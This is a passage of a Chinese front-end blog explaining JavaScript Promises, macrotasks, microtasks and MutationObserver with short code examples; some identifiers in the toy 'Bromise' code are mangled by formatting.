<p>我们先来看看<code>Promise</code>是怎么消灭嵌套回调的。产生嵌套函数的一个主要原因是在发起任务请求时会带上回调函数，这样当任务处理结束之后，下个任务就只能在回调函数中来处理了。</p>
<p><code>Promise</code>主要通过下面两步解决嵌套回调问题的。</p>
<p>首先，<code>Promise</code>实现了回调函数的延时绑定。回调函数的延时绑定在代码上体现就是先创建 <code>Promise</code>对象<code>x1</code>，通过<code>Promise</code>的构造函数<code>executor</code>来执行业务逻辑；创建好<code>Promise</code>对象<code>x1</code>之后，再使用<code>x1.then</code>来设置回调函数。示范代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 Promise 对象 x1，并在 executor 函数中执行业务逻辑</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> x1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line"></span><br><span class="line"><span class="comment">//x1 延迟绑定回调函数 onResolve</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onResolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">&#125;</span><br><span class="line">x1.<span class="title function_">then</span>(onResolve)</span><br></pre></td></tr></table></figure>
<p>其次，需要将回调函数<code>onResolve</code>的返回值穿透到最外层。因为我们会根据<code>onResolve</code>函数的传入值来决定创建什么类型的<code>Promise</code>任务，创建好的<code>Promise</code>对象需要返回到最外层，这样就可以摆脱嵌套循环了。你可以先看下面的代码：</p>
<img src="/2019/12/05/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Promise/img2.png" class="" title="回调函数返回值穿透到最外层">

<p>现在我们知道了<code>Promise</code>通过回调函数延迟绑定和回调函数返回值穿透的技术，解决了循环嵌套。</p>
<p>那接下来我们再来看看<code>Promise</code>是怎么处理异常的，如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> rand = <span class="title class_">Math</span>.<span class="title function_">random</span>()</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(rand)</span><br><span class="line">  <span class="keyword">if</span> (rand &gt; <span class="number">0.5</span>) <span class="title function_">resolve</span>()</span><br><span class="line">  <span class="keyword">else</span> <span class="title function_">reject</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p0 = <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = p0.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;succeed-1&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p3 = p1.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;succeed-2&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p4 = p3.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;succeed-3&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p4.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>这段代码有四个<code>Promise</code>对象：<code>p0 ～ p4</code>。无论哪个对象里面抛出异常，都可以通过最后一个对象<code>p4.catch</code>来捕获异常，通过这种方式可以将所有<code>Promise</code>对象的错误合并到一个函数来处理，这样就解决了每个任务都需要单独处理异常的问题。</p>
<p>之所以可以使用最后一个对象来捕获所有异常，是因为<code>Promise</code>对象的错误具有“冒泡”性质，会一直向后传递，直到被<code>onReject</code>函数处理或<code>catch</code>语句捕获为止。具备了这样“冒泡”的特性后，就不需要在每个<code>Promise</code>对象中单独捕获异常了。</p>
<p>通过这种方式，我们就消灭了嵌套调用和频繁的错误处理，这样使得我们写出来的代码更加优雅，更加符合人的线性思维。</p>
<h1 id="Promise-与微任务"><a href="#Promise-与微任务" class="headerlink" title="Promise 与微任务"></a>Promise 与微任务</h1><p>那么<code>Promise</code>和微任务的关系到底体现哪里呢？</p>
<p>我们可以结合下面这个简单的<code>Promise</code>代码来回答这个问题：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> demo = <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onResolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">&#125;</span><br><span class="line">demo.<span class="title function_">then</span>(onResolve)</span><br></pre></td></tr></table></figure>
<p>对于上面这段代码，我们需要重点关注下它的执行顺序。</p>
<p>首先执行<code>new Promise</code>时，<code>Promise</code>的构造函数会被执行，不过由于<code>Promise</code>是 V8 引擎提供的，所以暂时看不到<code>Promise</code>构造函数的细节。</p>
<p>接下来，<code>Promise</code>的构造函数会调用<code>Promise</code>的参数<code>executor</code>函数。然后在<code>executor</code>中执行了<code>resolve</code>，<code>resolve</code>函数也是在 V8 内部实现的，那么<code>resolve</code>函数到底做了什么呢？我们知道，执行<code>resolve</code>函数，会触发<code>demo.then</code>设置的回调函数<code>onResolve</code>，所以可以推测，<code>resolve</code>函数内部调用了通过<code>demo.then</code>设置的<code>onResolve</code>函数。</p>
<p>不过这里需要注意一下，由于<code>Promise</code>采用了回调函数延迟绑定技术，所以在执行<code>resolve</code>函数的时候，回调函数还没有绑定，那么只能推迟回调函数的执行。</p>
<p>这样按顺序陈述可能把你绕晕了，下面来模拟实现一个<code>Promise</code>，我们会实现它的构造函数、<code>resolve</code>方法以及<code>then</code>方法，以方便你能看清楚<code>Promise</code>的背后都发生了什么。这里我们就把这个对象称为<code>Bromise</code>，下面就是<code>Bromise</code>的实现代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Bromise</span>(<span class="params">executor</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> onResolve* = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">var</span> onReject* = <span class="literal">null</span></span><br><span class="line">  <span class="comment">// 模拟实现 resolve 和 then，暂不支持 rejcet</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">then</span> = <span class="keyword">function</span> (<span class="params">onResolve, onReject</span>) &#123;</span><br><span class="line">    onResolve* = onResolve</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="comment">//setTimeout(()=&gt;&#123;</span></span><br><span class="line">    onResolve*(value)</span><br><span class="line">  <span class="comment">// &#125;,0)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">executor</span>(resolve, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察上面这段代码，我们实现了自己的构造函数、<code>resolve</code>、<code>then</code>方法。接下来我们使用<code>Bromise</code>来实现我们的业务代码，实现后的代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将 Promise 改成我们自己的 Bromsie</span></span><br><span class="line"><span class="keyword">let</span> demo = <span class="keyword">new</span> <span class="title class_">Bromise</span>(executor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onResolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">&#125;</span><br><span class="line">demo.<span class="title function_">then</span>(onResolve)</span><br></pre></td></tr></table></figure>
<p>执行这段代码，我们发现执行出错，输出的内容是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Uncaught TypeError: onResolve\_ is not a function</span><br><span class="line">at resolve (&lt;anonymous&gt;:10:13)</span><br><span class="line">at executor (&lt;anonymous&gt;:17:5)</span><br><span class="line">at new Bromise (&lt;anonymous&gt;:13:5)</span><br><span class="line">at &lt;anonymous&gt;:19:12</span><br></pre></td></tr></table></figure>
<p>之所以出现这个错误，是由于<code>Bromise</code>的延迟绑定导致的，在调用到<code>onResolve*</code>函数的时候，<code>Bromise.then</code>还没有执行，所以执行上述代码的时候，当然会报<code>onResolve* is not a function</code>的错误了。</p>
<p>也正是因为此，我们要改造<code>Bromise</code>中的<code>resolve</code>方法，让<code>resolve</code>延迟调用<code>onResolve\_</code>。</p>
<p>要让<code>resolve</code>中的<code>onResolve*</code>函数延后执行，可以在<code>resolve</code>函数里面加上一个定时器，让其延时执行<code>onResolve*</code>函数，你可以参考下面改造后的代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    onResolve * value</span><br><span class="line">  &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面采用了定时器来推迟<code>onResolve</code>的执行，不过使用定时器的效率并不是太高，好在我们有微任务，所以<code>Promise</code>又把这个定时器改造成了微任务了，这样既可以让<code>onResolve\*</code>延时被调用，又提升了代码的执行效率。这就是<code>Promise</code>中使用微任务的原由了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Web 页面是单线程架构模型，这种模型决定了我们编写代码的形式——异步编程。基于异步编程模型写出来的代码会把一些关键的逻辑点打乱，所以这种风格的代码不符合人的线性思维方式。接下来我们试着把一些不必要的回调接口封装起来，简单封装取得了一定的效果，不过，在稍微复制点的场景下依然存在着回调地狱的问题。然后我们分析了产生回调地狱的原因：</p>
<ul>
<li>多层嵌套的问题；</li>
<li>每种任务的处理结果存在两种可能性（成功或失败），那么需要在每种任务执行结束后分别处理这两种可能性。</li>
</ul>
<p><code>Promise</code>通过回调函数延迟绑定、回调函数返回值穿透和错误“冒泡”技术解决了上面的两个问题。</p>
<p><code>Promise</code>之所以要使用微任务是由<code>Promise</code>回调函数延迟绑定技术导致的。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/" rel="tag">JS事件循环机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS事件循环机制——宏任务和微任务"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/04/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/"
    >JS事件循环机制——宏任务和微任务</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/04/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/" class="article-date">
  <time datetime="2019-12-04T10:16:11.000Z" itemprop="datePublished">2019-12-04</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="宏任务"><a href="#宏任务" class="headerlink" title="宏任务"></a>宏任务</h1><p>页面中的大部分任务都是在主线程上执行的，这些任务包括了：</p>
<ul>
<li>渲染事件（如解析 DOM、计算布局、绘制）；</li>
<li>用户交互事件（如鼠标点击、滚动页面、放大缩小等）；</li>
<li>JavaScript 脚本执行事件；</li>
<li>网络请求完成、文件读写完成事件。</li>
</ul>
<p>为了协调这些任务有条不紊地在主线程上执行，页面进程引入了消息队列和事件循环机制，渲染进程内部会维护多个消息队列，比如延迟执行队列和普通的消息队列。然后主线程采用一个<code>for</code>循环，不断地从这些任务队列中取出任务并执行任务。我们把这些消息队列中的任务称为宏任务。</p>
<p>消息队列中的任务是通过事件循环系统来执行的，这里我们可以看看在WHATWG 规范中是怎么定义事件循环机制的。</p>
<p>这里大致总结下 WHATWG 规范定义的大致流程：</p>
<ul>
<li>先从多个消息队列中选出一个最老的任务，这个任务称为<code>oldestTask</code>；</li>
<li>然后循环系统记录任务开始执行的时间，并把这个<code>oldestTask</code>设置为当前正在执行的任务；</li>
<li>当任务执行完成之后，删除当前正在执行的任务，并从对应的消息队列中删除掉这个<code>oldestTask</code>；</li>
<li>最后统计执行完成的时长等信息。</li>
</ul>
<p>以上就是消息队列中宏任务的执行过程。</p>
<p>宏任务可以满足我们大部分的日常需求，不过如果有对时间精度要求较高的需求，宏任务就难以胜任了，下面我们就来分析下为什么宏任务难以满足对时间精度要求较高的任务。</p>
<p>前面我们说过，页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件等都随时有可能被添加到消息队列中，而且添加事件是由系统操作的，JavaScript 代码不能准确掌控任务要添加到队列中的位置，控制不了任务在消息队列中的位置，所以很难控制开始执行任务的时间。为了直观理解，你可以看下面这段代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;demo&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>test<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">timerCallback2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">timerCallback</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(timerCallback2, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(timerCallback, <span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这段代码中，我的目的是想通过<code>setTimeout</code>来设置两个回调任务，并让它们按照前后顺序来执行，中间也不要再插入其他的任务，因为如果这两个任务的中间插入了其他的任务，就很有可能会影响到第二个定时器的执行时间了。</p>
<p>但实际情况是我们不能控制的，比如在你调用<code>setTimeout</code>来设置回调任务的间隙，消息队列中就有可能被插入很多系统级的任务。你可以打开<code>Performance</code>工具，来记录下这段任务的执行过程：</p>
<img src="/2019/12/04/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img1.png" class="" title="Performance 记录">

<p><code>setTimeout</code>函数触发的回调函数都是宏任务，如图中，左右两个黄色块就是<code>setTimeout</code>触发的两个定时器任务。</p>
<p>现在你可以重点观察上图中间浅红色区域，这里有很多一段一段的任务，这些是被渲染引擎插在两个定时器任务中间的任务。试想一下，如果中间被插入的任务执行时间过久的话，那么就会影响到后面任务的执行了。</p>
<p>所以说宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合了，比如监听 DOM 变化的需求。</p>
<h1 id="微任务"><a href="#微任务" class="headerlink" title="微任务"></a>微任务</h1><p>在理解了宏任务之后，下面我们就可以来看看什么是微任务了。异步回调的概念，其主要有两种方式。</p>
<p>第一种是把异步回调函数封装成一个宏任务，添加到消息队列尾部，当循环系统执行到该任务的时候执行回调函数。这种比较好理解，<code>setTimeout</code>和<code>XMLHttpRequest</code>的回调函数都是通过这种方式来实现的。</p>
<p>第二种方式的执行时机是在主函数执行结束之后、当前宏任务结束之前执行回调函数，这通常都是以微任务形式体现的。</p>
<p>那这里说的微任务到底是什么呢？</p>
<p>微任务就是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前。</p>
<p>不过要搞清楚微任务系统是怎么运转起来的，就得站在 V8 引擎的层面来分析下。</p>
<p>我们知道当 JavaScript 执行一段脚本的时候，V8 会为其创建一个全局执行上下文，在创建全局执行上下文的同时，V8 引擎也会在内部创建一个微任务队列。顾名思义，这个微任务队列就是用来存放微任务的，因为在当前宏任务执行的过程中，有时候会产生多个微任务，这时候就需要使用这个微任务队列来保存这些微任务了。不过这个微任务队列是给 V8 引擎内部使用的，所以你是无法通过 JavaScript 直接访问的。</p>
<p>也就是说每个宏任务都关联了一个微任务队列。那么接下来，我们就需要分析两个重要的时间点——微任务产生的时机和执行微任务队列的时机。</p>
<p>我们先来看看微任务是怎么产生的？在现代浏览器里面，产生微任务有两种方式。</p>
<p>第一种方式是使用<code>MutationObserver</code>监控某个 DOM 节点，然后再通过 JavaScript 来修改这个节点，或者为这个节点添加、删除部分子节点，当 DOM 节点发生变化时，就会产生 DOM 变化记录的微任务。</p>
<p>第二种方式是使用<code>Promise</code>，当调用<code>Promise.resolve()</code>或者<code>Promise.reject()</code>的时候，也会产生微任务。</p>
<p>通过 DOM 节点变化产生的微任务或者使用<code>Promise</code>产生的微任务都会被 JavaScript 引擎按照顺序保存到微任务队列中。</p>
<p>好了，现在微任务队列中有了微任务了，那接下来就要看看微任务队列是何时被执行的。</p>
<p>通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。WHATWG 把执行微任务的时间点称为检查点。当然除了在退出全局执行上下文式这个检查点之外，还有其他的检查点。</p>
<p>如果在执行微任务的过程中，产生了新的微任务，同样会将该微任务添加到微任务队列中，V8 引擎一直循环执行微任务队列中的任务，直到队列为空才算执行结束。也就是说在执行微任务过程中产生的新的微任务并不会推迟到下个宏任务中执行，而是在当前的宏任务中继续执行。</p>
<p>为了直观地理解什么是微任务，参考下面的示意图：</p>
<img src="/2019/12/04/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img2.png" class="" title="微任务添加和执行流程示意图">

<p>该示意图是在执行一个 ParseHTML 的宏任务，在执行过程中，遇到了 JavaScript 脚本，那么就暂停解析流程，进入到 JavaScript 的执行环境。从图中可以看到，全局上下文中包含了微任务列表。</p>
<p>在 JavaScript 脚本的后续执行过程中，分别通过<code>Promise</code>和<code>removeChild</code>创建了两个微任务，并被添加到微任务列表中。接着 JavaScript 执行结束，准备退出全局执行上下文，这时候就到了检查点了，JavaScript 引擎会检查微任务列表，发现微任务列表中有微任务，那么接下来，依次执行这两个微任务。等微任务队列清空之后，就退出全局执行上下文。</p>
<p>以上就是微任务的工作流程，从上面分析我们可以得出如下几个结论：</p>
<p>微任务和宏任务是绑定的，每个宏任务在执行时，会创建自己的微任务队列。</p>
<p>微任务的执行时长会影响到当前宏任务的时长。比如一个宏任务在执行过程中，产生了 100 个微任务，执行每个微任务的时间是 10 毫秒，那么执行这 100 个微任务的时间就是 1000 毫秒，也可以说这 100 个微任务让宏任务的执行时间延长了 1000 毫秒。所以你在写代码的时候一定要注意控制微任务的执行时长。</p>
<p>在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况下，微任务都早于宏任务执行。</p>
<h1 id="监听-DOM-变化方法演变"><a href="#监听-DOM-变化方法演变" class="headerlink" title="监听 DOM 变化方法演变"></a>监听 DOM 变化方法演变</h1><p>现在知道了微任务是怎么工作的，那接下来我们再来看看微任务是如何应用在<code>MutationObserver</code>中的。<code>MutationObserver</code>是用来监听 DOM 变化的一套方法。</p>
<p>比如许多 Web 应用都利用 HTML 与 JavaScript 构建其自定义控件，与一些内置控件不同，这些控件不是固有的。为了与内置控件一起良好地工作，这些控件必须能够适应内容更改、响应事件和用户交互。因此，Web 应用需要监视 DOM 变化并及时地做出响应。</p>
<p>虽然监听 DOM 的需求是如此重要，不过早期页面并没有提供对监听的支持，所以那时要观察 DOM 是否变化，唯一能做的就是轮询检测，比如使用<code>setTimeout</code>或者<code>setInterval</code>来定时检测 DOM 是否有改变。这种方式简单粗暴，但是会遇到两个问题：如果时间间隔设置过长，DOM 变化响应不够及时；反过来如果时间间隔设置过短，又会浪费很多无用的工作量去检查 DOM，会让页面变得低效。</p>
<p>直到 2000 年的时候引入了<code>Mutation Event</code>，<code>Mutation Event</code>采用了观察者的设计模式，当 DOM 有变动时就会立刻触发相应的事件，这种方式属于同步回调。</p>
<p>采用<code>Mutation Event</code>解决了实时性的问题，因为 DOM 一旦发生变化，就会立即调用 JavaScript 接口。但也正是这种实时性造成了严重的性能问题，因为每次 DOM 变动，渲染引擎都会去调用 JavaScript，这样会产生较大的性能开销。比如利用 JavaScript 动态创建或动态修改 50 个节点内容，就会触发 50 次回调，而且每个回调函数都需要一定的执行时间，这里我们假设每次回调的执行时间是 4 毫秒，那么 50 次回调的执行时间就是 200 毫秒，若此时浏览器正在执行一个动画效果，由于<code>Mutation Event</code>触发回调事件，就会导致动画的卡顿。</p>
<p>也正是因为使用<code>Mutation Event</code>会导致页面性能问题，所以<code>Mutation Event</code>被反对使用，并逐步从 Web 标准事件中删除了。</p>
<p>为了解决了<code>Mutation Event</code>由于同步调用 JavaScript 而造成的性能问题，从 DOM4 开始，推荐使用<code>MutationObserver</code>来代替<code>Mutation Event</code>。<code>MutationObserver API</code>可以用来监视 DOM 的变化，包括属性的变化、节点的增减、内容的变化等。</p>
<p>那么相比较<code>Mutation Event</code>，<code>MutationObserver</code>到底做了哪些改进呢？</p>
<p>首先，<code>MutationObserver</code>将响应函数改成异步调用，可以不用在每次 DOM 变化都触发异步调用，而是等多次 DOM 变化后，一次触发异步调用，并且还会使用一个数据结构来记录这期间所有的 DOM 变化。这样即使频繁地操纵 DOM，也不会对性能造成太大的影响。</p>
<p>我们通过异步调用和减少触发次数来缓解了性能问题，那么如何保持消息通知的及时性呢？如果采用<code>setTimeout</code>创建宏任务来触发回调的话，那么实时性就会大打折扣，因为在两个任务之间，可能会被渲染进程插入其他的事件，从而影响到响应的实时性。</p>
<p>这时候，微任务就可以上场了，在每次 DOM 节点发生变化的时候，渲染引擎将变化记录封装成微任务，并将微任务添加进当前的微任务队列中。这样当执行到检查点的时候，V8 引擎就会按照顺序执行微任务了。</p>
<p>综上所述，<code>MutationObserver</code>采用了“异步 + 微任务”的策略。</p>
<ul>
<li>通过异步操作解决了同步操作的性能问题；</li>
<li>通过微任务解决了实时性的问题。</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/" rel="tag">JS事件循环机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS事件循环机制——XMLHttpRequest"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
